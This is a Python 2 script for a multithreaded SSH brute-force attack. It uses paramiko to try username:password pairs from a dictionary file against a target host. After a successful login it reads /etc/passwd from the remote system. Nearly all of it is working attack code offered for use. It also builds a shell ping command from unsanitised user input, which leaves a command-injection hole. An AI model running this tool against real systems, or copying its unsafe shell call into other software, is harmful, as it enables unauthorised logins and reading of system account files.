#!/usr/bin/python

"""

    Multithreaded Bruteforce Script Using Paramiko
    Usage: ./multithread_sshbrute.py [host-ip] [dictionary-file-path]
    Example: ./multithreaded_sshbrute.py 192.168.1.114 uname-pword.txt
    
    Warning: 
                1. The dictionary file path needs to point to a valid dictionary file,
                with strict format of username:password on everyline

                2. The host of the given host ip must be up and active in the network
   
   Future improvements: 
                
                1. Enter the command you wish to execute on remote system as a user cmdline arg
                2. Move the config file elsewhere for easy edit, and import it in this script for usage
                3. Make this script more object oriented with tasks_setup and all its related function calls 
                    encapsulated in custom class, and its methods.


"""

# importing modules needed
import paramiko                 # for ssh client 
import sys                      # for system implementations
import os                       # for termainal checks
import time                     # for effiency implemantations
import Queue                    # for keeping track of tasks
import threading                # for spawning slave threads

##################################################################################################################################################

# global settings
__CONFIG__ = {                                                              # only num_of_attempts_per_thread is used
            "ssh_server_default_max_startup"     : 10,                      # others maybe implemented to wait for grace period
            "ssh_server_default_max_session"     : 10,                      # before attempting after the max startup attempts again
            "ssh_server_default_login_Gracetime" : 120,                     # for testing purposes, we did not implement the functionality
            "num_of_attempts_per_thread"         : 4                        # for production, please add in the functionality
        }

__SUCCESS__ = False                                                         # to be toggled upon bruteforce, and checked upon each queue job

##################################################################################################################################################

# class definition
class BruteForce_Worker(threading.Thread):                                  # custom thread class
    """
        Args: 
            threading.Thread (class): the threading.Thread class to inherit from
            
        Returns: 
            Once called and object initiated, 
            this class will return a thread object 
        
    """
    
    def __init__(self, queue, threadnumber, targetIP):
        """
            Args:
                self (object): The self object, provides a way to refer to self attributes
                queue (object): A queue to be working with by this specific thread worker (FIFO)
                threadnumber (int): The identifying number of each thread

            Returns: 
                An initiated object with all the given params as its respective attributes
    
        """
        threading.Thread.__init__(self)                                     # initializing from original thread class
        self.ssh = ssh_client_setup()                                                      # assigning the existing ssh instance
        self.queue = queue                                                  # assigning queue
        self.threadnumber = threadnumber                                    # assigning this particular thread its thread number, for ID
        self.targetIP = targetIP                                            # assigning target host IP
        print '[!] Thread %i is initiated, and ready to work!' %self.threadnumber

#................................................................................................................................................#

    def run(self):                                                          # each thread will do the following
        """
            Args: 
                self (object): the self object for self referring
            
            Returns: 
                Effect: the initiated threadworker needs to get job from queue
                        format job, pass to bruteforce function and finishes tasks
                        each time the threadworker will run a global check to see 
                        if username and password have been found, if so calling closing_queue

        """
        global __SUCCESS__                                                  # we will utitlize the global success check for each queue job
        
        while True:                                                         # this will check the success flag, if not true as of yet: 
            if not __SUCCESS__: 
                line = self.queue.get()                                     # getting each queue task
                user_pass = line.strip().split(':')                         # splitting it into a list format for [username, password]
                bruteforce(self.ssh, self.targetIP, user_pass, self.threadnumber)          
                                                                            # passing all parameters to bruteforce function
                self.queue.task_done()                                      # upon completion, we will call task_done()
            else:                                                           # if success flag is toggled true by bruteforce function
                close_queue(self.queue)                                     # passing this entire queue to queue closing procedures
                self.ssh.close()                                            # closing ssh connection
                print '[!] Thread %i finished, exiting...' % self.threadnumber
                break
                

##################################################################################################################################################

# function definitions
def error(msg):                                                 
    """
        Args: 
            msg (string): the error message to be outputted onto stdo
        
        Returns:
            Effect: outputs error messgae to stdo

    """
    print '#' * 100
    print '[!] Uh oh, looks like something went wrong...'
    print '[!] ' + msg

#------------------------------------------------------------------------------------------------------------------------------------------------#

def usage():                                                        # to be outputted if the initial user input was missing
    """
        Args:
            None

        Returns: 
            Effect: Outputs usage to stdo
        
    """
    print '#'*100
    print '[!] Usage: ./multithread-sshbrute.py [host-ip] [file-path]'
    print '[!] Example: ./multithread-sshbrute.py 192.168.1.114 uname-pword.txt'
    print '#'*100
    print '[!] Exiting...'

#-------------------------------------------------------------------------------------------------------------------------------------------i----#

def input_check(arg_list):
    """
        Args: 
            arg_list (list): list of arguments passed in from command line and from script execution
        
        Returns:
            Effect: goes through the arg_list and see if first element (host ip) is pingable
                    and if second element (dict-file-path) is valid
                    if not, print out error and usage message and exits with status of 1
    

    """
    
    ping_response = os.system('ping -c 1 -w2 ' + arg_list[1] + ' > /dev/null 2>&1')         # check if first arg is pingable
    
    if ping_response is not 0:                                                              # if above command does not return with 0
                                                                                            # 0 is success exit status from bash
        err_msg = 'The target system is not up atm, please try again..'
        error(err_msg)                                                                      # prints error message
        usage()                                                                             # prints usage message
        sys.exit(1)                                                                         # exits with status of 1

    if not os.path.isfile(arg_list[2]):                                                                             # check if file path is valid
        err_msg = 'The dictionary file does not exist, please make sure you have entered the correct file path'
        error(err_msg)                                                                                              # if not print out error
        usage()                                                                                                     # and usage
        sys.exit(1)                                                                                                 # lastly exits with 1 status

#------------------------------------------------------------------------------------------------------------------------------------------------#

def main(host, file_path):
    """
        Args: 
            host (string): host ip passed in from script main execution
            file_path (string): dictionary file path passed in from script main executin
        
        Returns: 
            Effect: sets up ssh instance from paramiko, 
                    and runs all the tasks, and eventually closing up ssh instance
    
    """
    global __CONFIG__
    
    tasks_setup(host, file_path, __CONFIG__['num_of_attempts_per_thread'])              # we need to open up file and set up tasks with this


    print '[!] Exiting...'

#-----------------------------------------------------------------------------------------------------------------------------------------------#

def ssh_client_setup():
    """
        Args: 
            None

        Returns: 
            ssh (object): paramiko ssh instance object after getting initiated 
    """
    ssh = paramiko.SSHClient()                                                  # ssh instance initiation using SSHClient method
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())                   # setting the auto add host policy for ssh client
    paramiko.util.log_to_file("paramiko.log")                                   # setting the log file for any exceptional handling

    return ssh                                                                  # finally returning the instance to main execution

#------------------------------------------------------------------------------------------------------------------------------------------------#

def tasks_setup(host, filePath, num_of_attempts_per_thread):
    """
        Args:
            host (string): the host ip to attack
            filePath (string): the dictionary file path to use for each bruteforce attempt
            num_of_attempts_per_thread (int): how many jobs in each queue for each thread to work
        
        Returns: 
            Effect: This will first do a format check for each line of the input dictionary file
                    then we will set up the queue depending on how many lines present in dict file
                    then we will set up each thread with ssh instance, its own queue, threadnumber, and host ip

    """
    
    fd = open(filePath, 'r')                                    # open up file to read
    lines = fd.readlines()                                      # returns a list format of each line per element
    format_checker(lines)                                       # issuing check on each line's format
    threads = []                                                # initialzing for threads to live

    if len(lines) < (num_of_attempts_per_thread * 4):
        num_of_threads = 1                                                              # thread count
        queues = queue_setup(num_of_threads, lines)                                     # setting up queue tasks
        t = thread_factory(queues[queues.keys()[0]], 1, host)                           # setting up threads to work
        threads.append(t)                                                               # pushing it into our threads list

    else:                                                                               # same thing goes for 4 queue scenario
        num_of_threads = 4
        queues = queue_setup(num_of_threads, lines)
        for queue_name in queues:
            t = thread_factory(queues[queue_name], int(queue_name[10]), host)           # tenth element is the thread number
            threads.append(t)                                                           # pushing all threads into the list

    
    for thread in threads:                                                              # joining the main method until all threads are done
        thread.join()

#------------------------------------------------------------------------------------------------------------------------------------------------#

def format_checker(list_of_lines):
    """
        Args:
            list_of_lines (list): list that contains each line for each element to be examined
        
        Returns: 
            Effect: Warning messages will be prompted if ill formated username:password are found
                    checks by splitting each line by :, and if : is not present, 
                    the split length is 1 instead of 2
    
    """
    
    warning_msg = "[!] Warning!!!! username:password format is not strict in the input file, " 
    warning_exception = 'this will generate an error of list index out of range in the bruteforce function!'
    fix = '[!] Please use an input dictionary file that has a strict format on each of its lines to be ==> username:password'
    
    for line in list_of_lines:                              # iterating through the list

        if len(line.strip().split(':')) == 1:               # if there is no : in line
            print warning_msg + warning_exception           # outputs all information to stdo
            print fix

#-----------------------------------------------------------------------------------------------------------------------------------------------#

def queue_setup(num, lines):
    """
        Args:
            num (int): number of thread needed
            lines (list): list of each line of the input file as each element
        
        Returns: 
            queue (dictionary): a dictionary of each numbered queue as key and its queue as value
    
    """

    queue_obj = {}                                          # initiating the queue
    
    for i in range(1, num + 1):                             # populating the queue obj
        name = 'queue_num_' + str(i)                        # adding key
        queue_obj[name] = Queue.Queue()                     # adding value
    
    queues = jobadder(queue_obj, num, lines)                # add in all the jobs to each of the queues in the queues dictionary
    
    return queues                                           # finally returning the queue to task_init

#-----------------------------------------------------------------------------------------------------------------------------------------------#

def jobadder(queue_obj, num, lines):     
    """
        Args:
            queue_obj (dictionary): a dictionary of queues
            num (int): the number of threads/queues needed 
            lines (list): a list of lines to be split up and added to each queue if needed
        
        Returns:
            queue_obj (dictionary): After adding in job tasks (lines) to each queue, the same dictionary is returned

    """
    
    if num == 1:                                                # one queue needed senario
        for line in lines:                                      # in this case adding all the lines to our only queue in queue obj
            queue_obj[queue_obj.keys()[0]].put(line)       
    else:                                                       # four queue needed senario
        offset = len(lines) / 4                                 # to as evenly divide as possible, we set offset to be divded by 4
        for queue_name in queue_obj:                            # iterate through the queue_obj
            if queue_name == 'queue_num_1':                     # if we are in the first queue
                for line in lines[:offset]:                     # iterate through each of the line in the list of lines before the first offset 
                    queue_obj[queue_name].put(line)             # adding in each line before the first offset to the queue
            elif queue_name == 'queue_num_2':                   # do the same for the next three queues
                for line in lines[offset:offset+offset]:        # but increment by its offset
                    queue_obj[queue_name].put(line)
            elif queue_name == 'queue_num_3':
                for line in lines[offset+offset:offset+offset+offset]:
                    queue_obj[queue_name].put(line)
            elif queue_name == 'queue_num_4':
                for line in lines[offset+offset+offset:]:
                    queue_obj[queue_name].put(line)

    return queue_obj                                            # finally returning the same dictionary after all tasks have been added to each

#-----------------------------------------------------------------------------------------------------------------------------------------------#
            
def thread_factory(queue, threadnumber, host):
    """
        Args:
            queue (object): each of the queue to be passed in for each thread to work with
            threadnumber (int): threadnumber for thread identification
            host (string): host ip to be passed in to each thread to attack

        Returns:
            slave_thread (object): the thread object to be returned to init_task
                                    after initiated with all inital values passed in
                                    
    
    """
    
    slave_thread = BruteForce_Worker(queue, threadnumber, host)                 # invoking BruteForce_Worker thread class
    slave_thread.setDaemon(True)                                                # making sure this thread is a daemon
    slave_thread.start()                                                        # starting the thread

    return slave_thread         # returning to task_init to have its queue to be joined until all tasks are done and the new thread gets created

#------------------------------------------------------------------------------------------------------------------------------------------------#

def close_queue(queue):
    """
        Args: 
            queue (object): called and passed in from the thread worker run function
        
        Returns: 
            Effect: Checks if the queue is empty, if it is not, 
                    get each task and call done until queue is empty

    
    """

    while queue.empty() is False:                       # checks queue if it is empty
        task = queue.get()                              # if not get each tasks
        queue.task_done()                               # and call task_done on it

#------------------------------------------------------------------------------------------------------------------------------------------------#

def bruteforce(ssh, host, user_pass, thread_id):
    """
        Args:
            ssh (object): ssh instance that we are working with
            host (string): host ip to attack
            user_pass (list): [username, password] format string to be used for bruteforce
            thread_id (int): the current thread ID calling bruteforce performing tasks
        
        Returns:
            Effect: Will try to connect with ssh instance and the input host, username and password
                    if it works, prints to stdo and toggles global variable success to on
                    and execute command on remote system
                    if it doesnt work, print exception message
    """ 
    
    global __SUCCESS__

    # assumming the user-pass file is of the form  username:password\n
    try: 
        print '[+] Thread %i: Trying to login using username: %s and password = %s' %(thread_id, user_pass[0], user_pass[1])
        ssh.connect(host, username=user_pass[0], password=user_pass[1], banner_timeout=60, auth_timeout=60)         # using connect method

    except Exception as e:                                                                                          # if failed, print e 
        print '[-] Thread ' + str(thread_id) + ': Bruteforce Attempt failed because of exception: ', e
    else:
        __SUCCESS__ = True                                                                                          # if success, toggle true
        print '[+] Successfully logged in using username: %s, and password: %s' %(user_pass[0], user_pass[1])       # print to stdo
        stdin, stdout, stderr = ssh.exec_command('cat /etc/passwd')                                                 # execute command 
                
        for line in stdout.readlines():                                                                             # print out output
            print line.strip()

#################################################################################################################################################

# script execution
if __name__ == '__main__':                                                      # not an export module
    if len(sys.argv) is not  3:                                                 # we need total 3 cmdline args including the program itself
        usage()                                                         
        sys.exit(1)
    start_time = time.time()
    input_check(sys.argv)                                                       # checking input
    main(sys.argv[1], sys.argv[2])                                              # calling main
    print '[!] Total execution time: %f seconds' % (time.time() - start_time)   # calculating and outputting total execution time
    sys.exit(0)

